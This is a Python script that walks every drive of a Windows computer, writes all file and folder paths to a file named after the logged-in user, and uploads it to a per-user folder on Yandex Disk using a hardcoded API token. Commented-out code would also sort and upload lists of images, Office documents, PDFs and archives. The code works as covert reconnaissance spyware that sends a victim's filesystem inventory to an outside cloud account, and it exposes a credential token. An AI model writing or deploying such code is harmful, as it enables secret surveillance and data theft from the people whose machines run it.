import yadisk
import os

y = yadisk.YaDisk(token="AgAAAAAT2TPsAAaFBhuFgUOq7UfJnwyQEE9ydgc")
os.system('mkdir' + ' ' + str(os.getlogin()))
f = open(str(os.getlogin()) + '/' + str(os.getlogin()) + '.txt', 'a', encoding='utf-8')

drives = os.popen("fsutil fsinfo drives").readlines()[1][7:-2].split()

for i in range(0, len(drives)):
	actual_drive = drives[i]

	for dirname, dirnames, filenames in os.walk(actual_drive):

		f.write(str(os.path.join(dirname)) + '\n')

		for subdirname in dirnames:

			f.write(str(os.path.join(dirname, subdirname)) + '\n')

		for filename in filenames:

			f.write(os.path.join(dirname, filename) + '\n')
"""
			if os.path.join(dirname, filename).lower()[-4:] == '.jpg':
				f.close
				f = open(str(os.getlogin())+'/'+str(os.getlogin())+'_jpg.txt', 'a', encoding='utf-8')
				f.write(os.path.join(dirname, filename) + '\n')
				f.close
				f = open(str(os.getlogin())+'/'+str(os.getlogin())+'.txt', 'a', encoding='utf-8')
			elif os.path.join(dirname, filename).lower()[-4:] == '.png':
				f.close
				f = open(str(os.getlogin())+'/'+str(os.getlogin())+'_png.txt', 'a', encoding='utf-8')
				f.write(os.path.join(dirname, filename) + '\n')
				f.close
				f = open(str(os.getlogin())+'/'+str(os.getlogin())+'.txt', 'a', encoding='utf-8')
			elif os.path.join(dirname, filename).lower()[-4:] == '.doc':
				f.close
				f = open(str(os.getlogin())+'/'+str(os.getlogin())+'_doc.txt', 'a', encoding='utf-8')
				f.write(os.path.join(dirname, filename) + '\n')
				f.close
				f = open(str(os.getlogin())+'/'+str(os.getlogin())+'.txt', 'a', encoding='utf-8')
			elif os.path.join(dirname, filename).lower()[-5:] == '.docx':
				f.close
				f = open(str(os.getlogin())+'/'+str(os.getlogin())+'_docx.txt', 'a', encoding='utf-8')
				f.write(os.path.join(dirname, filename) + '\n')
				f.close
				f = open(str(os.getlogin())+'/'+str(os.getlogin())+'.txt', 'a', encoding='utf-8')
			elif os.path.join(dirname, filename).lower()[-4:] == '.xls':
				f.close
				f = open(str(os.getlogin())+'/'+str(os.getlogin())+'_xls.txt', 'a', encoding='utf-8')
				f.write(os.path.join(dirname, filename) + '\n')
				f.close
				f = open(str(os.getlogin())+'/'+str(os.getlogin())+'.txt', 'a', encoding='utf-8')
			elif os.path.join(dirname, filename).lower()[-5:] == '.xlsx':
				f.close
				f = open(str(os.getlogin())+'/'+str(os.getlogin())+'_xlsx.txt', 'a', encoding='utf-8')
				f.write(os.path.join(dirname, filename) + '\n')
				f.close
				f = open(str(os.getlogin())+'/'+str(os.getlogin())+'.txt', 'a', encoding='utf-8')
			elif os.path.join(dirname, filename).lower()[-4:] == '.ppt':
				f.close
				f = open(str(os.getlogin())+'/'+str(os.getlogin())+'_ppt.txt', 'a', encoding='utf-8')
				f.write(os.path.join(dirname, filename) + '\n')
				f.close
				f = open(str(os.getlogin())+'/'+str(os.getlogin())+'.txt', 'a', encoding='utf-8')
			elif os.path.join(dirname, filename).lower()[-5:] == '.pptx':
				f.close
				f = open(str(os.getlogin())+'/'+str(os.getlogin())+'_pptx.txt', 'a', encoding='utf-8')
				f.write(os.path.join(dirname, filename) + '\n')
				f.close
				f = open(str(os.getlogin())+'/'+str(os.getlogin())+'.txt', 'a', encoding='utf-8')
			elif os.path.join(dirname, filename).lower()[-4:] == '.pdf':
				f.close
				f = open(str(os.getlogin())+'/'+str(os.getlogin())+'_pdf.txt', 'a', encoding='utf-8')
				f.write(os.path.join(dirname, filename) + '\n')
				f.close
				f = open(str(os.getlogin())+'/'+str(os.getlogin())+'.txt', 'a', encoding='utf-8')
			elif os.path.join(dirname, filename).lower()[-4:] == '.zip':
				f.close
				f = open(str(os.getlogin())+'/'+str(os.getlogin())+'_zip.txt', 'a', encoding='utf-8')
				f.write(os.path.join(dirname, filename) + '\n')
				f.close
				f = open(str(os.getlogin())+'/'+str(os.getlogin())+'.txt', 'a', encoding='utf-8')
			elif os.path.join(dirname, filename).lower()[-4:] == '.rar':
				f.close
				f = open(str(os.getlogin())+'/'+str(os.getlogin())+'_rar.txt', 'a', encoding='utf-8')
				f.write(os.path.join(dirname, filename) + '\n')
				f.close
				f = open(str(os.getlogin())+'/'+str(os.getlogin())+'.txt', 'a', encoding='utf-8')
			elif os.path.join(dirname, filename).lower()[-3:] == '.7z':
				f.close
				f = open(str(os.getlogin())+'/'+str(os.getlogin())+'_7z.txt', 'a', encoding='utf-8')
				f.write(os.path.join(dirname, filename) + '\n')
				f.close
				f = open(str(os.getlogin())+'/'+str(os.getlogin())+'.txt', 'a', encoding='utf-8')
			else:
				f.write(str(os.path.join(dirname, filename)) + '\n')
"""


if y.check_token():
	dirname = "/users/" + str(os.getlogin())
	try:
		y.mkdir(dirname)
	except yadisk.exceptions.DirectoryExistsError:
		print('папка уже существует')
	try:
		y.upload(str(os.getlogin()) + '/' + str(os.getlogin()) + '.txt', dirname + "/" + str(os.getlogin()) + '.txt')
		"""
		y.upload(str(os.getlogin())+'/'+str(os.getlogin())+'_jpg.txt', dirname + "/" + str(os.getlogin())+ '_jpg.txt')
		y.upload(str(os.getlogin())+'/'+str(os.getlogin())+'_png.txt', dirname + "/" + str(os.getlogin())+ '_png.txt')
		y.upload(str(os.getlogin())+'/'+str(os.getlogin())+'_doc.txt', dirname + "/" + str(os.getlogin())+ '_doc.txt')
		y.upload(str(os.getlogin())+'/'+str(os.getlogin())+'_docx.txt', dirname + "/" + str(os.getlogin())+ '_docx.txt')
		y.upload(str(os.getlogin())+'/'+str(os.getlogin())+'_xls.txt', dirname + "/" + str(os.getlogin())+ '_xls.txt')
		y.upload(str(os.getlogin())+'/'+str(os.getlogin())+'_xlsx.txt', dirname + "/" + str(os.getlogin())+ '_xlsx.txt')
		y.upload(str(os.getlogin())+'/'+str(os.getlogin())+'_ppt.txt', dirname + "/" + str(os.getlogin())+ '_ppt.txt')
		y.upload(str(os.getlogin())+'/'+str(os.getlogin())+'_pptx.txt', dirname + "/" + str(os.getlogin())+ '_pptx.txt')
		y.upload(str(os.getlogin())+'/'+str(os.getlogin())+'_pdf.txt', dirname + "/" + str(os.getlogin())+ '_pdf.txt')
		y.upload(str(os.getlogin())+'/'+str(os.getlogin())+'_zip.txt', dirname + "/" + str(os.getlogin())+ '_zip.txt')
		y.upload(str(os.getlogin())+'/'+str(os.getlogin())+'_rar.txt', dirname + "/" + str(os.getlogin())+ '_rar.txt')
		y.upload(str(os.getlogin())+'/'+str(os.getlogin())+'_7z.txt', dirname + "/" + str(os.getlogin())+ '_7z.txt')
		"""
	except yadisk.exceptions.PathExistsError:
		pass
	except FileNotFoundError:
		pass
else:
	pass

f.close()
